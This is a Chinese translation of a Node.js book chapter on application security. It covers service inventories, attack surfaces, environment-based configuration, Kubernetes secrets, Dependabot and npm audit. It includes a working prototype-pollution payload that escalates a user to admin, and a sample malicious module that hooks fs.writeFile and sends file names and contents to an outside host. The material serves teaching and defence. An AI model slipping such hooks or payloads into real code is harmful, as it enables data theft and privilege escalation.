# 第十章：安全性

安全性对所有应用程序都是一个重要问题，特别是那些面临网络的应用程序。传统上，影响 Web 应用程序最大的漏洞是简单的 SQL 注入攻击。多年来，这种攻击一直由于文档不良和库要求用户手动构建 SQL 查询字符串而广泛存在。幸运的是，过去十年中，编程社区已经显著发展，你很难找到一个现代化的库或教程，它们会推广查询字符串的串联。

然而，SQL 注入仍然是应用程序安全性最高风险之一，在 [OWASP 十大安全风险](https://owasp.org/www-project-top-ten/) 中排名第一。SQL 注入攻击已经有很多详细的文档，并且数据库库中的脆弱边缘情况足够引起注意，因此我不打算在本章中详细讨论它们。

然而，有一些新的独特挑战似乎是 Node.js 平台固有的，这些挑战并没有得到广泛理解。甚至还有一些相对较新的工具可以帮助自动发现和修补这些漏洞。这些挑战和工具是本章的重点。

其中一个挑战是确定应用程序的攻击面。传统上，攻击来自外部来源，比如攻击者通过网络发送恶意请求。但是当攻击者编写的恶意代码进入您的应用程序依赖的包时会发生什么呢？

在深入研究各个安全问题之前，制定一个检查清单以帮助识别不同应用程序的健康状态非常重要。这一点在那些使用多种微服务来驱动应用程序的组织中尤为重要。

# 维护代码库

构建后端系统的常见模式是使用微服务来表示应用程序的各个领域。通常通过创建单独的版本控制代码库、初始化新的模块结构，然后添加 JavaScript 文件来实现。这可以从头开始，也可以模仿其他代码库中使用的模式。

在这些情况下，团队和代码库通常是一对多的所有关系，尽管有时会有几个受欢迎的项目，多个团队会共同贡献。其他时候，一些代码库可能会变成孤立无主，没有明确的所有者。我个人曾在一些公司工作过，几个团队共同拥有几十个微服务。

拥有这些项目的团队有不同的优先事项。有时候，一个团队非常重视保持项目的最新状态和应用安全补丁。其他时候，一个项目的 *package-lock.json* 可能会长时间不被改动。

有时候，需要指定一位工程师负责整个组织中所有 Node.js 项目的健康状态。当我加入一家公司时，我通常会自愿承担这个角色。这样做不仅有助于公司保持控制，还帮助我熟悉公司的微服务及其相互操作方式。

我采用了一个模式，也建议你考虑一下，首先追踪公司使用的不同服务，并维护一个包含所有遇到的不同服务的电子表格。

即使应用程序可能在几种不同的范例（这里是 Kubernetes，那里是专用的 VPS，还有一点 Lambda）下运行，组织通常仍然会使用单一版本控制服务来组织其所有代码。这个工具是获取服务列表的最佳地点。例如，GitHub 提供了按语言列出仓库的功能：

```
https://github.com/<org>?language=javascript
```

一旦您获取了组织中的仓库列表，就需要缩小条目，直到您只有一份活跃的 Node.js 服务列表。为您找到的每项服务在表格中创建一个新行。确保在表格中跟踪您能够的任何相关信息，例如指向仓库的链接，拥有仓库的团队，部署媒介，以及最重要的是项目运行的 Node.js 版本。

我还喜欢跟踪一些其他信息，比如项目使用的重要软件包的版本。例如，Web 服务器软件包的名称和版本，以及适用的情况下，组织维护的任何重要软件包的版本。跟踪 Web 服务器很重要，因为在安全方面，它是 HTTP 服务器的主要进出口。它通常是应用程序中最复杂的部分，因此是最有可能暴露安全漏洞的组件之一。

一些组织选择发布用于与重要服务通信的内部软件包，而不是记录和公开用于与服务通信的协议。例如，公司可能已发布一个名为 `@corp/acct` 的账户软件包。跟踪这些内部软件包同样重要，因为它可能影响到在账户服务中停用和放弃哪些功能的决策。

表 10-1 是这种电子表格中可能跟踪的信息的一个示例。

表 10-1\. Node.js 服务电子表格示例

| 服务 | 团队 | Node.js 版本 | 部署 | 服务器 | 账户包 |
| --- | --- | --- | --- | --- | --- |
| 画廊 | 自拍 | v10.3.1 | Beanstalk | express@v3.1.1 | @corp/acct@v1.2.3 |
| 档案 | 档案 | v12.1.3 | Kubernetes | @hapi/hapi@14.3.1 | @corp/acct@v2.1.1 |
| 调整器 | 自拍 | v12.13.1 | Lambda | N/A | N/A |
| 朋友查找 | 朋友 | v10.2.3 | Kubernetes | fastify@2.15.0 | @corp/acct@v2.1.1 |

在这个表格中，*服务*列包含项目的通用名称。这可以是 GitHub 存储库的名称，它在网络上标识自己的服务名称，或者理想情况下两者兼有。*团队*列包含拥有项目的团队。尽管可能有多个团队为项目做出贡献，但通常会有一个所有者的概念。

*Node.js 版本*列不言自明，但有时可能很难找到确切的 Node.js 版本，比如在 AWS Lambda 上运行服务时。在这些情况下，您可能需要记录`process.version`值以获得准确的结果。*部署*列传达有关进程如何部署和管理的信息，例如作为 Kubernetes pod 或通过 AWS Beanstalk 运行。

*服务器*列包含有关 Web 服务器包的信息，特别是名称和版本。最后，*账户包*包含关于内部`@corp/acct`包的信息，对于这个虚构的组织来说，这个包非常重要。

现在列表已编制完成，是时候逐个检查并突出显示任何已过时的条目了。例如，如果当前*长期支持（LTS）*版本的 Node.js 是 v14，那么意味着 Node.js v12 可能处于维护模式，Node.js v10 及更早的版本已不再更新。更新*Node.js 版本*列，将活跃 LTS 的服务标记为绿色，维护中的服务标记为黄色，而老旧的服务标记为红色。“升级 Node.js” 包含有关如何处理过时版本 Node.js 的信息。

对于包含 web 服务器和内部模块等包列也适用相同原则。对于这些，您可能需要制定自己的颜色编码系统。例如，Express 和 Fastify web 服务器很少发布新的主要版本，因此可能只有当前主要版本应标记为绿色。另一方面，Hapi 框架发布主要版本的频率较快，可能最近的两个主要版本值得标记为绿色背景。“升级依赖项” 包括自动化包升级的解决方案。

###### 提示

我鼓励您进行一些侦探工作，并为组织中的服务汇编这样的电子表格。完成后，您将更好地理解您的应用程序。在减少技术债务时，此表格将是信息的重要来源。

# 识别攻击面

大多数攻击似乎发生在应用程序的边缘，即一个范式遇到另一个范式的地方。一些常见的例子包括将传入的 HTTP 请求转换为 JavaScript 对象，将修改后的对象序列化为 SQL 查询，以及将对象生成 HTML 文档。

传统上，服务的攻击通常通过“前门”进行，也就是说，暴露给外部消费者的应用程序部分。对于 HTTP 服务来说，这意味着传入的 HTTP 请求；对于工作进程来说，这可能意味着它从中接收消息的队列；对于将上传的 HTML 文件转换为 PDF 的守护进程来说，前门可以被认为是文件系统。

这些情况很容易理解。你的应用程序本质上是一个有着巨大前门的城堡，因此在那里设置警卫是有意义的。当涉及到保护 HTTP 应用程序时，确保协议没有被篡改，传递的数据没有超出预期，并且未预料到的参数应该被忽略是非常重要的。[Helmet](https://helmetjs.github.io/) npm 包提供了一个中间件，实施了几个安全最佳实践，适用于 HTTP 服务器，这可能对你有益。

现代应用程序内部存在更深的攻击面，特别是使用 Node.js 构建的应用程序。恰巧你的城堡可能隐藏着一个潜在的叛徒。但首先，让我们集中在前门上。

## 参数检查和反序列化

应用程序必须始终验证来自外部来源的输入是否合法。有时这些输入的来源是显而易见的，比如 HTTP `POST` 请求的正文。其他时候则不那么明显，比如个别的 HTTP 标头。

出现在大多数平台上的参数解析和对象反序列化的攻击也存在。但有几种攻击似乎在 Node.js 应用程序中更为普遍，在我看来，这是因为 JavaScript 是一种弱类型语言，而且调用`JSON.parse()`是如此容易。在其他平台上，一个应用程序可能有一个`User`类，并且提供了一个表示用户的 JSON 字符串。该用户类可能有几个属性，比如`name:string`和`age:integer`。在这种情况下，可以通过将 JSON 文档流经反序列化器、选择预期的属性、忽略任何不相关的内容，并且永远不使用超过表示`name`和`age`所需的内存来反序列化用户的 JSON 表示。

话虽如此，使用 JavaScript，在应用程序中更有可能看到的方法如下：

```
const temp = JSON.parse(req.body);
const user = new User({name: temp.name, age: temp.age});
```

这种方法有一些缺点。首先，如果攻击者发送一个庞大的 JSON 对象，也许是几兆字节？在这种情况下，当应用程序调用`JSON.parse()`方法时会变慢，并且还会使用几兆字节的内存。如果攻击者并行发送数百个请求，每个请求都有庞大的 JSON 对象会发生什么？在这种情况下，攻击者可能导致服务器实例无响应并崩溃，从而导致*拒绝服务*攻击。

修复这个问题的一种方法是在接收请求体时强制执行最大请求大小限制。每个流行的 Web 框架在某种程度上都支持这一点。例如，Fastify 框架支持一个`bodyLimit`配置标志，默认为 1MB。Express 使用的`body-parser`中间件支持一个`limit`标志，功能相同，默认为 100KB。

处理反序列化对象时会遇到其他问题。其中一个问题是 JavaScript 特有的，称为*原型污染*，这是一种攻击，其中 JSON 负载包含一个名为`__proto__`的属性，可以用来覆盖对象的原型。调用`obj.__proto__ = foo`等同于`Object.setPrototypeOf(obj, foo)`，是一个危险的速记法，尽管不应存在但仍然存在以支持遗留代码。这种攻击在 2018 年引起了轰动，并在几个流行的库中得到了修复，但在今天的应用代码和库中仍然会出现。

示例 10-1 是原型污染攻击的精简版本。

##### 示例 10-1\. *prototype-pollution.js*

```
// WARNING: ANTIPATTERN!
function shallowClone(obj) {
  const clone = {};
  for (let key of Object.keys(obj)) {
    clone[key] = obj[key];
  }
  return clone;
}
const request = '{"user":"tlhunter","__proto__":{"isAdmin":true}}';
const obj = JSON.parse(request);

if ('isAdmin' in obj) throw new Error('cannot specify isAdmin');
const user = shallowClone(obj);
console.log(user.isAdmin); // true
```

在这个例子中，攻击者提供了一个带有`__proto__`属性的请求对象，它本身是另一个对象。在这个对象中，`isAdmin`属性被设置为 true。应用代码依赖于这个字段来确定是否有特权用户发出了请求。应用程序接收请求并将请求 JSON 解析为名为`obj`的对象。此时对象上有一个名为`__proto__`的属性，尽管它还没有设置无效的原型；幸运的是`JSON.parse()`无法直接覆盖对象的原型。接下来，应用程序检查`obj.isAdmin`字段是否已设置，这是确保用户未覆盖属性的一种方法。这个检查没有触发，代码继续执行。

然后，应用程序对请求对象执行浅克隆并返回结果。`shallowClone()`方法通过迭代对象的每个属性并将其赋值给新对象来进行克隆。这就是漏洞所在。`clone['__proto__']`赋值导致原型被覆盖。在这种情况下，生成的`user`对象的原型被设置为攻击者提供的`{"isAdmin":true}`对象。稍后应用程序检查该属性时，结果是用户权限被提升为管理员权限。

这一开始可能看起来有些牵强。但这实际上影响了许多不同的应用程序，并导致了至少几十个 npm 包的安全补丁。在现代 Node.js 应用程序构建方式中，一个第三方中间件正在解析请求对象，另一个中间件正在克隆对象，所有这些都在应用程序控制器逻辑最终访问解析后的 JSON 表示之前在幕后发生。由于数据在应用程序的难以察看的角落之间频繁移动，开发人员很难跟踪复杂的 Node.js 应用程序实际在做什么。

## 恶意 npm 包

另一个攻击面完全绕过了前门。这个攻击来自应用程序内部，通过“供应链”，通过恶意构造的 npm 包。这些攻击也可能影响其他平台，但迄今为止，似乎这是影响 npm 包仓库最多的问题之一，原因有几个。过去的包仓库并不像 npm 那样容易发布。还没有强制规定，发布到版本控制的代码必须与在安装包时部署的代码匹配，这意味着 GitHub 仓库中易于审核的代码可能不代表 tarball 安装时部署的代码。尽管发布的便利性和 JavaScript 的动态特性促成了 Node.js 和 npm 的流行，但它们无疑给安全留下了伤痕。

声称包可以被用作攻击向量可能听起来过于谨慎，但事实上已经多次发生过。有时恶意包是通过*错别字占用*安装的，即将包命名为流行包的错别字。有时它是一个完全新的包，承诺其他包不提供的功能。有时它比这更可怕，例如，流行包的维护者接受引入微妙安全漏洞的 PR，或者维护者将包的所有权交给了一个攻击者，而假定他们是好心的。

无论如何，恶意包将进入应用程序。Node.js 开发人员减少获取这些恶意包风险的最重要方法之一是尽量减少依赖项数量，支持由知名作者维护的包，并倾向于具有较少子依赖关系的依赖项。

一些组织尝试的方法是手动审核软件包并维护软件包版本的允许列表。不幸的是，这是一个非常困难的任务，并且通常需要整个团队进行审计，这是只有大型科技公司才能享有的特权。通过手动审查可以在组织内部使用哪些软件包，开发人员经常陷入困境，他们的工单被阻塞，因为等待软件包批准请求。此外，手动审核软件包并不能保证其免受所有漏洞的影响。即使如此，批准的软件包可能不会固定其子依赖版本，除非应用程序开发人员明确在*package-lock.json*文件中固定它们，否则不能保证新的恶意软件包不会潜入。

与恶意包的常见误解是，只有当它们直接触及通过应用程序流动的用户数据时才具有危险性，而深度嵌套的实用程序模块并没有太多风险。实际上，任何在 Node.js 应用程序中加载的模块都有能力以任何它认为合适的方式修改任何核心 Node.js API。

示例 10-2 描述了一个 Node.js 模块，一旦被需要，就会拦截任何文件系统写入并将其传输到第三方服务。

##### 示例 10-2\. *malicious-module.js*

```
const fs = require('fs');
const net = require('net');
const CONN = { host: 'example.org', port: 9876 };
const client = net.createConnection(CONN, () => {});
const _writeFile = fs.writeFile.bind(fs);
fs.writeFile = function() {
  client.write(`${String(arguments[0])}:::${String(arguments[1])}`);
  return _writeFile(...arguments);
};
```

此模块将现有的`fs.writeFile`方法替换为一个新的方法，该方法代理请求到原始方法。但它还会从该方法获取文件名和数据参数，并将它们传输到监听`example.org:9876`的第三方服务。在这种情况下，无论模块嵌套多深，它都会拦截对核心 Node.js API 的调用。

此方法也可以用来包装其他模块。例如，可以轻松修改以包装像`pg`这样的数据库包，并在包含名为*password*的字段时传输表示写入到 Postgres 数据库表的有效负载。

# 应用程序配置

应用程序通过设置各种键/值对来进行配置，这些键/值对由代码使用。这些值可以是如写入临时文件目录的路径、从队列中抓取的项数，或者 Redis 实例的主机名。乍看之下，这些配置值可能看起来与安全性关系不大，但配置通常包含更敏感的信息。例如，可能包括 Postgres 连接的用户名和密码，或者 GitHub 账户的 API 密钥。

处理敏感配置值时，重要的是不仅要将其远离攻击者的手中，还要远离组织中任何不需要访问的人。一个经验法则是将每个仓库都视为明天可能开源的仓库，并考虑任何已经检入的凭据为已被泄露。员工的笔记本可能会被盗，毕竟。但是，在保持凭据远离代码库的同时，如何构建应用程序呢？

## 环境变量

将配置保持在应用程序代码库之外的最佳方法是通过环境变量提供这些值。这样一来，即使代码库受到损害，也不会导致敏感数据被窃取。通过以下两个命令快速刷新一下环境变量的工作原理：

```
$ echo "console.log('conn:', process.env.REDIS)" > app-env-var.js
$ REDIS="redis://admin:hunter2@192.168.2.1" node app-env-var.js
```

本示例创建了一个简单的 *app-env-var.js* 文件，该文件打印一个配置值，然后在提供环境变量的同时执行该文件。通过这种方法，环境变量永远不会写入磁盘。^(2)

使用环境变量配置应用程序的一个非常有用的副作用是，可以重新部署应用程序而无需重新构建！许多服务部署工具（包括 Kubernetes）允许您更改环境变量并使用相同的 Docker 镜像构建再次部署应用程序。这节省了时间，因为您不需要通过更改代码中的配置值、创建拉取请求、运行测试等流程。

环境变量在应用程序首次运行之前设置一次，然后在进程的整个生命周期中被视为静态。需要动态更改的任何值都需要使用不同的工具来访问配置值，例如 Etcd 等工具通常用于跟踪不经常更改但在运行时可能更改的信息，例如数据库服务器的主机名。

这种方法的唯一真正缺点是，开发人员在本地运行应用程序之前必须设置多个环境变量。根据应用程序的构建方式，可能会在首次执行时方便地崩溃，或者稍后在尝试连接到名为 *undefined* 的服务器的数据库时崩溃。

在设计读取环境变量的应用程序时，考虑如果缺少任何必需的值，立即崩溃并打印一条可以帮助开发者的消息。这里有一个有用的终止消息示例：

```
if (!process.env.REDIS) {
  console.error('Usage: REDIS=<redis_conn> node script.js');
  process.exit(1);
}
```

为了让开发人员更容易，一种方法是创建一个“env 文件”，这是一个包含导出键/值对的文件。通过在 shell 中源化此文件，不同的环境变量对将加载到终端会话中。使用这种方法，env 文件不应该被提交到代码库中。如果这是多位工程师可能使用的文件，则可以将其添加到代码库的 *.gitignore* 文件中；如果只有一个工程师使用，则可以将其添加到特定工程师的全局 git 忽略文件中。

创建一个名为 *dev.env* 的新文件，并将来自示例 10-3 的内容添加到其中。这是一个包含单个条目的 env 文件的示例。

##### 示例 10-3\. *dev.env*

```
export REDIS=redis://admin:hunter2@192.168.2.1
```

此文件名为*dev.env*，表示它包含开发环境的环境变量配置。默认情况下，文件中的值在终端中不可用，但一旦文件被源化，它们将一直保留，直到手动删除或终端会话退出。运行以下命令来证明这一点：

```
$ node -e "console.log(process.env.REDIS)"
> undefined
$ source dev.env
$ node -e "console.log(process.env.REDIS)"
> redis://admin:hunter2@192.168.2.1
```

在文件被源化后多次运行`node`命令应该会导致相同的消息出现。

###### 注意

源化后续的环境文件将覆盖先前的值，但仅在新文件中设置了它们的情况下。务必在每个环境文件中定义相同的环境变量；否则，你将得到多个环境的值。

通过这种方法，当开发者的笔记本受到威胁时，你又回到了原点，会导致凭证泄露的问题。话虽如此，如果仓库内容被泄露（或者临时承包商获取了访问权限），环境变量仍然是安全的。

## 配置文件

在我遇到的大多数应用程序中，配置文件被用作存储任何和所有配置值的抓包。传统上表示为全大写常量的任何内容可能会被移到这些文件中。通常的模式是为每个环境都有一个单独的配置文件，例如*config/staging.js*和*config/production.js*。通过这种方法，应用程序通常会按每个环境硬编码信息，例如主机名和端口。

这种方法违反了先前概述的安全问题，但这并不意味着该模式不能以其他方式利用。存储不包括凭据和主机名的信息仍然是可以接受的，特别是当应用程序需要在不同环境中表现出不同行为时。安全使用配置文件的最佳方式是从环境变量中读取敏感信息。

像`config`和`nconf`这样的包提供了一种机制，根据当前环境从不同的文件中加载和合并配置。就我个人而言，我认为使用这些包通常是杀鸡用牛刀，可以用你即将实现的几行代码来代替。

用于执行应用程序配置的模块应该执行几项任务。首先，它应该通过检查标准的`NODE_ENV`环境变量来确定当前环境。接下来，它应该加载特定于当前环境的配置文件。最后，作为便利，它还应该加载一个备用配置文件，其中包含如果在特定环境文件中缺少的默认值。备用文件对于每个环境中始终以相同方式配置的项目非常有用，例如加载相同的`REDIS`环境变量。

运行以下命令来创建一个名为*configuration*的新目录，在其中初始化一个新的 npm 项目，然后为几个环境创建一些配置文件：

```
$ mkdir configuration && cd configuration
$ npm init -y
$ mkdir config
$ touch config/{index,default,development,staging,production}.js
```

应用程序代码需要通过引入 *config/index.js* 文件来访问配置值。它导出一个表示配置键/值对的单个对象。*config/default.js* 文件包含备用配置值。其余三个文件是特定于环境的。

接下来，修改 *config/default.js* 文件，并将来自 示例 10-4 的内容添加到其中。

##### 示例 10-4\. *configuration/config/default.js*

```
module.exports = {
  REDIS: process.env.REDIS,
  WIDGETS_PER_BATCH: 2,
  MAX_WIDGET_PAYLOAD: Number(process.env.PAYLOAD) || 1024 * 1024
};
```

在这个默认配置文件中，`REDIS` 连接字符串默认加载由 `REDIS` 环境变量提供的值。与业务逻辑相关的 `WIDGETS_PER_BATCH` 配置默认为保守值 2\. 最后，`MAX_WIDGET_PAYLOAD` 值是一个数字，表示 `PAYLOAD` 环境变量或表示 1MB 的值。

这些值通过导出一个顶级对象提供给任何调用者。这意味着配置文件也可以使用 JSON 或 YAML 进行公开，尽管前者很难添加注释，而且两者都需要某种显式语法来读取和强制转换环境变量。

接下来，修改 *config/development.js* 文件，添加来自 示例 10-5 的内容。

##### 示例 10-5\. *configuration/config/development.js*

```
module.exports = {
  ENV: 'development',
  REDIS: process.env.REDIS || 'redis://localhost:6379',
  MAX_WIDGET_PAYLOAD: Infinity
};
```

开发配置文件定义了三个条目。第一个是 `ENV`，它是一种便利，允许应用程序通过读取 `CONFIG.ENV` 而不是 `process.env.NODE_ENV` 来获取当前环境。接下来是 `REDIS` 值，它覆盖了默认配置文件中的相同值。在这种情况下，该值默认连接到本地机器上的 Redis 实例。然而，如果用户选择提供 `REDIS` 环境值，它仍将被尊重。最后一个配置值 `MAX_WIDGET_PAYLOAD` 也覆盖了默认值，将其设置为 `Infinity`。

###### 提示

虽然可以在应用程序的整个代码库中访问 `process.env`，但这样做会使工程师难以找到和理解应用程序使用的每个环境变量。将所有环境变量读取集中到一个 *config/* 目录可以使它们自说明。

对于这个示例，*config/production.js* 和 *config/staging.js* 的内容并不是特别重要。它们各自应该导出相应命名的 `ENV` 配置值，并可能覆盖另一个设置，比如 `WIDGETS_PER_BATCH`。 值得考虑的一件事是，对于生产应用程序，分期和生产环境应该非常相似。 通过保持它们的相似性，您可以在生产之前在分期环境中发现问题。 例如，一个人可能选择在分期中使用单个队列，在生产中使用两个队列以减少成本。 然而，使用这样的配置，如果代码中总是从队列＃1 中删除消息，则在分期中不会遇到问题，并且在生产中将失败。

接下来，修改 *config/index.js* 文件以看起来像 示例 10-6。

##### 示例 10-6\. *configuration/config/index.js*

```
const { join } = require('path');
const ENV = process.env.NODE_ENV;

try {
  var env_config = require(join(__dirname, `${ENV}.js`));
} catch (e) {
  console.error(`Invalid environment: "${ENV}"!`);
  console.error(`Usage: NODE_ENV=<ENV> node app.js`);
  process.exit(1);
}
const def_config = require(join(__dirname, 'default.js'));

module.exports = Object.assign({}, def_config, env_config); ![1](img/1.png)
```

![1](img/#co_security_CO1-1)

浅合并配置文件

该文件将来自 *config/default.js* 配置文件的顶级属性与当前环境的适当配置文件中的值进行合并，然后导出合并后的值。 如果找不到配置文件，则模块会打印错误并且应用程序退出并显示非零状态代码。 由于应用程序可能无法在没有任何配置的情况下运行，并且假设配置是在启动过程的早期读取的，因此显示错误并终止进程是合适的。 最好立即失败，而不是在应用程序处理其第一个 HTTP 请求时失败。

然后，可以通过从 Node.js 模块要求配置文件来访问配置设置。 例如，连接到 Redis 实例的代码可能如下所示：

```
const Redis = require('ioredis');
const CONFIG = require('./config/index.js');
const redis = new Redis(CONFIG.REDIS);
```

通过这种方法，敏感配置设置被保持在磁盘之外和版本控制之外，开发人员可以自由地使用合理的默认值在本地运行其应用程序，环境变量访问是在一个中心位置完成的，并且可以维护每个环境配置。 通过使用像 *config/index.js* 这样的简单配置加载器，应用程序不依赖于另一个 npm 包。

## 机密管理

*机密管理* 是一种存储和检索敏感值的技术。 这通常包括像用户名，密码和 API 密钥这样的凭据。 实现机密管理的工具通常默认隐藏这些值，通常需要一种解密和查看它们的机制。 这种行为与环境变量处理方式有些不同，其中界面通常保持它们可见。

机密管理软件提供了一种应用程序在运行时检索机密的机制。 这些机密可以通过几种方式提供，例如通过应用程序从服务请求它们。 最方便的方法通常是将它们作为环境变量注入，这种方法不需要应用程序更改。

Kubernetes 支持秘密管理，并可以通过将包含秘密值的文件挂载到容器或通过环境变量提供秘密。使用 Kubernetes 定义秘密类似于定义其他资源。一种方法是通过创建一个 YAML 文件来定义秘密。以下是将 Redis 连接字符串转换为秘密的示例：

```
apiVersion: v1
kind: Secret
metadata:
  name: redisprod
type: Opaque
stringData:
  redisconn: "redis://admin:hunter2@192.168.2.1"
```

可以使用 YAML 文件定义多个秘密。在这种情况下，只定义了一个秘密，即 *redisprod:redisconn*。对于其他秘密，将它们分开可能是有意义的，例如处理单独的用户名和密码值时。应用此文件将秘密添加到 Kubernetes 集群中。然后可以销毁该文件，以及其中的任何明文秘密。

稍后，在另一个 YAML 文件中定义 Pod 时，可以在`spec.template.spec.containers`部分定义环境变量时引用该秘密。以下是其中一个这些环境变量可能的示例：

```
env:
- name: REDIS
  valueFrom:
    secretKeyRef:
      name: redisprod
      key: redisconn
```

在这种情况下，`REDIS`环境变量从 *redisprod:redisconn* 秘密中提取其值。当 Kubernetes 启动容器时，首先检索秘密，然后解密该值，最后提供给应用程序。

# 更新依赖项

任何具有足够多依赖项的 Node.js 项目最终都会包含已知的漏洞。如果项目不经常更新其依赖项，这一点尤其明显。项目在静止状态下可以“改变”的想法似乎有些违反直觉，但关键词是“已知”漏洞。这些漏洞在依赖项首次添加到项目时就存在——只是你和包的维护者后来才了解到这些漏洞。

帮助避免软件包漏洞的一种方法是保持其不断更新。理论上，软件包作者不断学习更好的实践，并且漏洞一直在被报告，因此保持软件包的更新应该会有所帮助。话虽如此，一旦应用程序正常运行，通过更新软件包可能会引入微妙的破坏性变化的风险。理想情况下，软件包作者遵循语义化版本（在“模块、软件包和语义化版本”中有介绍），但这并非总是发生。当然，新版本中可能会引入其他漏洞。有句老话说：“如果它没坏，就不要修复它。”

任何对应用程序依赖项的更改都将需要进行新一轮测试，因此持续保持依赖版本在前沿将需要大量工作。一个复杂的应用可能每隔几个小时就会发布新版本的依赖项！完全不更新依赖项将导致应用程序充满漏洞，且更新起来是一场噩梦。必须达成某种折中。

一个方法是仅在更新包含新功能、性能提升或特定受益于应用程序的漏洞修复的情况下更新包。其他重要的包，如主要的 Web 服务器或应用程序使用的框架，也值得进行常规更新，以便未来的重构更容易进行。

当你决定更新包时，考虑逐步进行更改。如果一个项目有 20 个需要升级的依赖项，那么可以将它们分解成几个拉取请求。对于更大范围的更改，比如更改 Web 服务器，如果可能的话，只在一个 PR 中更改一个依赖项（同时进行所需的应用程序更改）。对于紧密耦合的依赖项，比如数据库库和 SQL 查询构建器，可能将它们组合在一个 PR 中是有意义的。对于没有那么大应用程序影响的其他更改，比如开发依赖项，在一个拉取请求中升级几个依赖项可能也是可以接受的（假设没有涉及太多代码更改）。

###### 警告

如果一个拉取请求包含太多的更改，审阅者将无法找到 bug。如果没有关联的升级被合并，几乎不可能将代码更改与依赖项更改关联起来。

npm 管理着一个已知漏洞的数据库^(3)，并且有一个用于报告易受攻击包的网页。Snyk 还维护了他们的 [npm 包漏洞数据库](https://snyk.io/vuln?type=npm) 服务。在本节中，你将使用自动比较应用程序依赖项与 npm 漏洞数据库的工具。

## 使用 GitHub Dependabot 进行自动升级

GitHub 拥有多个自动化安全服务，可以在给定仓库上启用。它们支持多个平台，包括消耗 npm 包的 Node.js 项目。要启用这些服务，请访问你是管理员的仓库的“设置”选项卡，点击“安全性与分析”选项卡，然后启用提供的不同安全功能。截至本文写作时，GitHub 有三项服务：*依赖图*、*Dependabot 警报* 和 *Dependabot 安全更新*。每个服务都依赖于前一个服务。启用这些服务后，仓库将受益于自动拉取请求，用于升级依赖项。

Dependabot 是 GitHub 的一个服务，它会创建拉取请求来更新你的依赖项中已知的漏洞。图 10-1 是一个截图，显示了当已知漏洞被发现时，在仓库顶部会出现的横幅。

![GitHub 显示警报，项目包含已知漏洞](img/dsnj_1001.png)

###### 图 10-1\. 令人头痛的 GitHub 依赖性漏洞

目前，Dependabot 不支持更改应用程序代码。这意味着 Dependabot 不可能为每个漏洞创建一个拉取请求。例如，如果包 `foobar@1.2.3` 存在漏洞，并且唯一的修复方法在 `foobar@2.0.0` 中，那么 Dependabot 不会创建拉取请求，因为 SemVer 变更表明存在破坏性 API 更改。尽管如此，GitHub UI 仍会显示横幅，并提供有关易受影响包的上下文信息。

存储库上启用的任何持续集成测试仍将针对 Dependabot 拉取请求运行。这应该有助于确保特定升级是安全的。尽管如此，在涉及到对您的应用程序极为重要的包的拉取请求时，您最好在本地进行更改。

在您的存储库启用 Dependabot 安全更新后，您偶尔会收到拉取请求。图 10-2 是这些拉取请求的屏幕截图。

![Dependabot 创建拉取请求](img/dsnj_1002.png)

###### 图 10-2\. 自动 Dependabot 拉取请求

Dependabot 拉取请求提供了一系列命令列表，您可以通过回复来触发这些命令。Dependabot 不会在提交合并时连续地将拉取请求重新基于主分支进行重置。相反，您可以通过回复 **`@dependabot rebase`** 命令来触发重新基于的操作。该拉取请求还包含了有关正在修复的漏洞的上下文信息，例如来自变更日志的内容，甚至是当前安装版本和升级版本之间的 git 提交。

Dependabot 拉取请求非常方便，可以合并包的升级，并提供有关漏洞的大量有用信息。不幸的是，它仅适用于需要包升级的某些情况。对于其他情况，您需要更多的手动方法。

## 使用 npm CLI 进行手动升级

在某些情况下，Dependabot 简化了包升级的过程，但更多时候，您需要采取手动方法。npm CLI 提供了一些子命令来帮助简化这个过程。

运行以下命令以创建一个名为 *audit* 的新目录，创建一个新的 npm 项目，并安装一些已知漏洞的包：

```
$ mkdir audit && cd audit
$ npm init -y
$ npm install js-yaml@3.9.1 hoek@4.2.0
```

当`npm install`命令完成后，应显示一些消息。当我运行该命令时，虽然你可能在运行这些命令时看到更多的消息，但我得到以下消息：

```
added 5 packages from 8 contributors and audited 5 packages in 0.206s
found 3 vulnerabilities (2 moderate, 1 high)
  run `npm audit fix` to fix them, or `npm audit` for details
```

第一个你应该知道的命令会打印一个过时包的列表。这有助于找到需要升级的包，尽管不一定能找出哪些包有漏洞。运行以下命令以获取过时包的列表：

```
$ npm outdated
```

表 10-2 包含了我从这个命令中得到的结果。

表 10-2\. 示例 `npm outdated` 输出

| Package | Current | Wanted | Latest | Location |
| --- | --- | --- | --- | --- |
| hoek | 4.2.0 | 4.2.1 | 6.1.3 | audit |
| js-yaml | 3.9.1 | 3.14.0 | 3.14.0 | audit |

请注意，你看到的版本和软件包可能不同，因为新的软件包会不断发布。*当前* 列显示当前安装的软件包版本。*wanted* 列显示 *package.json* SemVer 范围所满足的最高版本，随着时间的推移，随着新的软件包发布，这将会有所不同。*latest* 列显示了 npm 上可用的最新软件包版本。最后的 *location* 列告诉你软件包的位置。

另一方面，`npm audit` 子命令^(4) 提供了当前项目中安装的已知安全漏洞的软件包列表。

默认情况下，npm CLI 会提醒你有关安装的软件包存在漏洞的警告。这不仅发生在直接安装有漏洞的软件包时，就像你刚刚做的那样，还发生在安装任何软件包时。运行以下两个命令以丢弃当前的 *node_modules* 目录，并从头开始重新安装所有内容：

```
$ rm -rf node_modules
$ npm install
```

你应该会再次看到相同的漏洞警告。但是这些漏洞消息仅作为总体警告，并不列出单个有问题的软件包。要获取更详细的信息，你需要运行另一个命令：

```
$ npm audit
```

此命令显示了有关漏洞的更多详细信息。它会遍历所有有漏洞的软件包列表，并显示它们的已知漏洞。运行该命令时，表格 10-3 包含了我看到的信息。

表格 10-3\. `npm audit` 示例输出

| 级别 | 类型 | 软件包 | 依赖关系 | 路径 | 更多信息 |
| --- | --- | --- | --- | --- | --- |
| 中等 | 拒绝服务 | js-yaml | js-yaml | js-yaml | [*https://npmjs.com/advisories/788*](https://npmjs.com/advisories/788) |
| 高 | 代码注入 | js-yaml | js-yaml | js-yaml | [*https://npmjs.com/advisories/813*](https://npmjs.com/advisories/813) |
| 中等 | 原型污染 | hoek | hoek | hoek | [*https://npmjs.com/advisories/566*](https://npmjs.com/advisories/566) |

在我的情况下，已知存在三个漏洞：两个在 `js-yaml` 软件包中，一个在 `hoek` 软件包中。npm 具有四个漏洞严重性级别：低、中等、高和严重。这些级别估计了漏洞可能影响应用程序的程度。*类型* 列为漏洞提供了一个简短的分类；第一个是 *拒绝服务* 攻击，可能会导致应用程序崩溃，并被评为中等严重性。*代码注入* 攻击则更为危险，可能导致像密码被盗这样的情况，并因此被标记为高级别。第三个 *原型污染* 也被视为中等。

